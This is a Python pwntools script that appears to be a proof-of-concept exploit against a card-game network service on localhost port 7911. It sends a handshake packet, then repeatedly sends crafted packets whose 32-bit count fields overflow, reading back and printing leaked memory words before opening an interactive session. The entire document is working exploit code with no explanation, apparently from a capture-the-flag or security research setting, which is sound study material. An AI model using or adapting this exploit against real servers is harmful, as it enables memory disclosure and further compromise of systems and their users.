from pwn import *
r = remote('127.0.0.1', 7911)
DECKERROR_UNKNOWNCARD = 0x4 << 28
backup = b'\xed\x00\x02\x37\x00\x00\x00\x02\x00\x00\x00\x60\x74\xf7\x04\xc7\x34\x48\x03\xc7\x34\x48\x03\xbc\x6d\xe5\x03\xbc\x6d\xe5\x03\xbc\x6d\xe5\x03\x5a\xf4\xc9\x01\x5a\xf4\xc9\x01\x5a\xf4\xc9\x01\xd3\x63\x47\x03\xd3\x63\x47\x03\xac\x33\x9d\x04\xac\x33\x9d\x04\xac\x33\x9d\x04\xba\xd3\xba\x01\xba\xd3\xba\x01\xcb\xf5\x33\x00\xcb\xf5\x33\x00\xcb\xf5\x33\x00\x2a\x95\x65\x01\x2a\x95\x65\x01\xd4\x27\x1c\x00\xa6\x9b\xf4\x01\x6f\xbe\x31\x04\x59\x7b\x63\x04\x59\x7b\x63\x04\x59\x7b\x63\x04\x23\xd6\x9d\x02\x23\xd6\x9d\x02\xa5\x2d\xf5\x03\xa5\x2d\xf5\x03\xa5\x2d\xf5\x03\x5e\xa3\xc0\x01\x60\x74\xf7\x04\x60\x74\xf7\x04\xd9\x47\x59\x00\xdb\x95\x6b\x02\xdb\x95\x6b\x02\xdb\x95\x6b\x02\x00\x2e\x0d\x05\x16\xd2\x17\x00\x16\xd2\x17\x00\x16\xd2\x17\x00\x71\xb2\x09\x01\xc6\x33\x63\x03\xb5\xf0\x01\x05\xe5\x2a\xb9\x01\x6b\xb1\xcc\x03\x4f\xe1\xec\x04\xc9\x2b\xac\x05\xc9\x2b\xac\x05\x4b\x4d\x5e\x04\xd2\x1b\x41\x01\xc1\x3b\xea\x02\x30\xc2\x12\x05\x52\xf7\x8a\x03\x96\xdd\x08\x00\x01\x00\x22'

def craftPayload (target):
    length = 0
    mainc = length + target
    sidec = 2 ** 32 - mainc
    newp = (13 + length * 4).to_bytes(2, byteorder='little')
    cardNum = b'\x60\x74\xf7\x04'

    newp += b'\x02'
    newp += (mainc).to_bytes(4, byteorder='little')
    newp += (sidec).to_bytes(4, byteorder='little')
    newp += cardNum * length + backup[-7:]
    return newp

payload = b'\x29\x00\x10\x50\x00\x6c\x00\x61\x00\x79\x00\x65\x00\x72\x00\x0d\x00\x00\x00\xc9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x45\x00\x00\x00\x00\x00\x00\x00\x31\x00\x12\x52\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xba\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x45\x56\x45\x4e\x54\x5f\x53\x48\x4f\x57\x5f\x4d\x45\x54\x48'
expectedResult = b'\x15\x00\x12\x38\x6e\x22\x9c\x00\x00\x05\x00\x00\x00\x00\x00\x40\x1f\x00\x00\x05\x01\xb4\x00\x02\x00\x13\x01\x2b\x00\x20\x50\x00\x6c\x00\x61\x00\x79\x00\x65\x00\x72\x00\x0d\x00\x00\x00\xf8\x3a\x02\x98\x32\x7f\x00\x00\xa0\x6f\xfa\x29\x7b\x55\x00\x00\x50\x8b\x19\x2a\x7b\x55\x00\x00\x00\x3a\x2b\x00\x20\x50\x00\x6c\x00\x61\x00\x79\x00\x65\x00\x72\x00\x0d\x00\x00\x00\xf8\x3a\x02\x98\x32\x7f\x00\x00\xa0\x6f\xfa\x29\x7b\x55\x00\x00\x50\x8b\x19\x2a\x7b\x55\x00\x00\x01\x3a'
r.send(payload)
result = r.recv()


print('leak memory\n====================================')
for i in range(1, 20):
    r.send(craftPayload(i))
    result = r.recv()
    value = int.from_bytes(result[-4:], 'little')
    if len(result) != 15:
        continue
    print(hex(i * 4) + ': ', end='')
    if value == 0x60000000:
        print(hex(0))
        continue
    if value - DECKERROR_UNKNOWNCARD < 0:
        print(hex(value - DECKERROR_UNKNOWNCARD + 2 ** 32))
    else:
        print(hex(value - DECKERROR_UNKNOWNCARD))

r.interactive()
